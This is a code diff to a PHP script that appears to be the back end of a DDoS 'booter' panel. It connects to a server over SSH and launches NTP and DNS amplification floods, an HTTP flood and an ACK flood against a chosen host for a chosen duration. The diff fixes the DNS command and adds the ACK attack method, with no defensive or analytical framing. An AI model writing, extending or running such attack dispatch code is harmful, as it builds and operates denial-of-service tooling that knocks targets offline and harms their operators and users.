@@ -65,8 +65,9 @@
     if(ssh2_auth_password($connection, $user, $password))
     {
       if($method == "NTP"){if(ssh2_exec($connection, "screen -dm -S $host timeout $time ./NTP $host $port ntp.list 2 300000 $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
-      if($method == "DNS"){if(ssh2_exec($connection, "screen -dm -S $host timeout $time ./NTP $host $port dns.list 2 300000 $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
+      if($method == "DNS"){if(ssh2_exec($connection, "screen -dm -S $host timeout $time ./DNS $host $port dns.list 2 300000 $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
       if($method == "HTTP"){if(ssh2_exec($connection, "screen -dm timeout $time node http.js $host $time /dev/null")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
+      if($method == "ACK"){if(ssh2_exec($connection, "screen -dm -S $host timeout $time ./ACK $host $port ntp.list 2 300000 $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}
       if($method == "stop"){if(ssh2_exec($connection, "pkill -f $host | screen -X -S $host quit")){echo "Attack stopped on $host!";}else{die("Ran into a error");}}      
     }
     else
